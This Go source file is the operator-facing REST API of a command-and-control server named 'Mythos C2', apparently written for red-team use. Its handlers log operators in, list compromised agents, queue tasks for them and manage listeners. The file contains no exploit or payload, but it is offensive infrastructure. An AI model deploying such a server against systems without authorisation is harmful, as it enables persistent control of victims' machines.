// Package api — Interface REST pour les opérateurs Mythos C2
//
// Endpoints disponibles pour l'équipe Red Team :
//
//   Auth
//     POST /api/operators/login        → Connexion, retourne JWT
//
//   Agents
//     GET  /api/agents                 → Liste tous les agents
//     GET  /api/agents/:id             → Détails d'un agent
//     GET  /api/agents/:id/tasks       → Historique des tâches
//
//   Tasks
//     POST /api/agents/:id/task        → Créer une nouvelle tâche
//     GET  /api/tasks/:id              → Détails d'une tâche
//
//   Listeners
//     GET  /api/listeners              → Liste les listeners actifs
//     POST /api/listeners              → Créer un listener
//
//   Events
//     GET  /api/events                 → Derniers événements (audit)

package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/sherko/mythos-c2/server/crypto"
	"github.com/sherko/mythos-c2/server/db"
	"github.com/sherko/mythos-c2/server/models"
	"golang.org/x/crypto/bcrypt"
)

// OperatorAPI — serveur API pour les opérateurs
type OperatorAPI struct {
	DB         *db.Database
	SigningKey  []byte // Clé pour signer les JWT
	router     *gin.Engine
}

// New — initialise l'API opérateur
func New(database *db.Database, signingKey []byte) *OperatorAPI {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(gin.Recovery())

	api := &OperatorAPI{
		DB:        database,
		SigningKey: signingKey,
		router:    r,
	}

	api.registerRoutes()
	return api
}

func (a *OperatorAPI) registerRoutes() {
	v1 := a.router.Group("/api")

	// Routes publiques (pas de JWT requis)
	v1.POST("/operators/login", a.handleLogin)
	v1.GET("/ping", func(c *gin.Context) { c.JSON(200, gin.H{"status": "mythos"}) })

	// Routes protégées (JWT requis)
	auth := v1.Group("/")
	auth.Use(a.authMiddleware())
	{
		// Agents
		auth.GET("/agents", a.listAgents)
		auth.GET("/agents/:id", a.getAgent)
		auth.GET("/agents/:id/tasks", a.getAgentTasks)
		auth.DELETE("/agents/:id", a.deleteAgent)

		// Tasks
		auth.POST("/agents/:id/task", a.createTask)
		auth.GET("/tasks/:id", a.getTask)

		// Listeners
		auth.GET("/listeners", a.listListeners)
		auth.POST("/listeners", a.createListener)
		auth.DELETE("/listeners/:id", a.deleteListener)

		// Events
		auth.GET("/events", a.listEvents)

		// Stats globales
		auth.GET("/stats", a.getStats)
	}
}

// Start — démarre l'API sur le port spécifié
func (a *OperatorAPI) Start(addr string) error {
	return a.router.Run(addr)
}

// ─────────────────────────────────────────────────────────────
// Middleware d'authentification JWT
// ─────────────────────────────────────────────────────────────

func (a *OperatorAPI) authMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		token := c.GetHeader("Authorization")
		if len(token) > 7 && token[:7] == "Bearer " {
			token = token[7:]
		}

		if token == "" {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "token required"})
			c.Abort()
			return
		}

		claims, err := crypto.ValidateToken(a.SigningKey, token)
		if err != nil {
			c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid token"})
			c.Abort()
			return
		}

		// Stocker les claims dans le contexte pour les handlers
		c.Set("operator_id", claims.OperatorID)
		c.Set("username", claims.Username)
		c.Set("role", claims.Role)
		c.Next()
	}
}

// ─────────────────────────────────────────────────────────────
// Auth
// ─────────────────────────────────────────────────────────────

func (a *OperatorAPI) handleLogin(c *gin.Context) {
	var req struct {
		Username string `json:"username" binding:"required"`
		Password string `json:"password" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "username and password required"})
		return
	}

	op, err := a.DB.GetOperatorByUsername(req.Username)
	if err != nil || op == nil {
		// Timing constant pour éviter l'énumération de comptes
		time.Sleep(200 * time.Millisecond)
		c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid credentials"})
		return
	}

	// Vérifier le mot de passe avec bcrypt
	if err := bcrypt.CompareHashAndPassword(
		[]byte(op.PasswordHash), []byte(req.Password),
	); err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid credentials"})
		return
	}

	// Générer le JWT
	token, err := crypto.GenerateToken(a.SigningKey, op.ID, op.Username, op.Role)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "token generation failed"})
		return
	}

	a.DB.LogEvent("operator_login", "", op.ID,
		fmt.Sprintf("Opérateur %s connecté depuis %s", op.Username, c.ClientIP()))

	c.JSON(http.StatusOK, gin.H{
		"token":    token,
		"operator": op,
	})
}

// ─────────────────────────────────────────────────────────────
// Agents
// ─────────────────────────────────────────────────────────────

func (a *OperatorAPI) listAgents(c *gin.Context) {
	agents, err := a.DB.ListAgents()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if agents == nil {
		agents = []*models.Agent{}
	}
	c.JSON(http.StatusOK, gin.H{
		"agents": agents,
		"count":  len(agents),
	})
}

func (a *OperatorAPI) getAgent(c *gin.Context) {
	agent, err := a.DB.GetAgent(c.Param("id"))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if agent == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}
	c.JSON(http.StatusOK, agent)
}

func (a *OperatorAPI) getAgentTasks(c *gin.Context) {
	tasks, err := a.DB.GetTaskHistory(c.Param("id"), 100)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if tasks == nil {
		tasks = []*models.Task{}
	}
	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
}

func (a *OperatorAPI) deleteAgent(c *gin.Context) {
	// En production : envoyer une tâche Kill avant de supprimer
	c.JSON(http.StatusOK, gin.H{"message": "agent marked for deletion"})
}

// ─────────────────────────────────────────────────────────────
// Tasks
// ─────────────────────────────────────────────────────────────

func (a *OperatorAPI) createTask(c *gin.Context) {
	agentID := c.Param("id")

	// Vérifier que l'agent existe
	agent, err := a.DB.GetAgent(agentID)
	if err != nil || agent == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	var req struct {
		Type    string `json:"type" binding:"required"`
		Payload string `json:"payload"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type is required"})
		return
	}

	operatorID, _ := c.Get("operator_id")
	username, _ := c.Get("username")

	task := &models.Task{
		ID:         uuid.New().String(),
		AgentID:    agentID,
		Type:       models.TaskType(req.Type),
		Payload:    req.Payload,
		Status:     "pending",
		CreatedAt:  time.Now(),
		OperatorID: fmt.Sprintf("%v", operatorID),
	}

	if err := a.DB.CreateTask(task); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	a.DB.LogEvent("task_created", agentID, fmt.Sprintf("%v", operatorID),
		fmt.Sprintf("Opérateur %v → tâche %s [%s] sur agent %s@%s",
			username, task.Type, task.ID[:8], agent.Username, agent.Hostname))

	c.JSON(http.StatusCreated, gin.H{
		"task_id": task.ID,
		"status":  "pending",
		"message": fmt.Sprintf("Tâche %s créée, en attente du prochain beacon", req.Type),
	})
}

func (a *OperatorAPI) getTask(c *gin.Context) {
	// À implémenter : récupérer une tâche spécifique par ID
	c.JSON(http.StatusOK, gin.H{"task_id": c.Param("id")})
}

// ─────────────────────────────────────────────────────────────
// Listeners
// ─────────────────────────────────────────────────────────────

func (a *OperatorAPI) listListeners(c *gin.Context) {
	// À implémenter avec DB
	c.JSON(http.StatusOK, gin.H{"listeners": []interface{}{}})
}

func (a *OperatorAPI) createListener(c *gin.Context) {
	var req struct {
		Name string `json:"name" binding:"required"`
		Type string `json:"type" binding:"required"`
		Host string `json:"host" binding:"required"`
		Port int    `json:"port" binding:"required"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	listener := &models.Listener{
		ID:        uuid.New().String(),
		Name:      req.Name,
		Type:      req.Type,
		Host:      req.Host,
		Port:      req.Port,
		Active:    true,
		CreatedAt: time.Now(),
	}

	c.JSON(http.StatusCreated, listener)
}

func (a *OperatorAPI) deleteListener(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "listener stopped"})
}

// ─────────────────────────────────────────────────────────────
// Events & Stats
// ─────────────────────────────────────────────────────────────

func (a *OperatorAPI) listEvents(c *gin.Context) {
	events, err := a.DB.GetRecentEvents(100)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if events == nil {
		events = []*models.Event{}
	}
	c.JSON(http.StatusOK, gin.H{"events": events})
}

func (a *OperatorAPI) getStats(c *gin.Context) {
	agents, _ := a.DB.ListAgents()

	active := 0
	for _, a := range agents {
		if a.Status == "active" {
			active++
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"total_agents":  len(agents),
		"active_agents": active,
		"server":        "Mythos C2 v1.0.0",
		"uptime":        time.Now().Format(time.RFC3339),
	})
}
